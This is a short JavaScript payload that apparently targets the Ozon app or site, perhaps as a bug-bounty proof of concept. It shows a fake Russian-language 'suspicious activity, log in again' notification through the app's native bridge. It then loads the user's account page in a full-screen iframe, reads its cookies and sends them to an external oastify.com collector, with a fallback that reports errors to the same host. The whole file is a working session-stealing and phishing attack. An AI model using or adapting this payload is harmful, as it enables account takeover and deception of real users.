alert('new_2');

ozonApp.showNotification(JSON.stringify({
    title: "Подтвердите вход",
    message: "Обнаружена подозрительная активность. Войдите заново",
}));

var f = document.createElement('iframe');
f.style = 'width:100%;height:100%';
f.src = 'https://www.ozon.ru/my/main';
document.body.appendChild(f);
f.onload = function() {
    try {
        var c = f.contentDocument.cookie;
        navigator.sendBeacon('https://nxozuruu04ozz2hvx3fbvmka81es2nqc.oastify.com/', c);
    } catch(e) {
        navigator.sendBeacon('https://nxozuruu04ozz2hvx3fbvmka81es2nqc.oastify.com/?sop', e.message);
    }
};
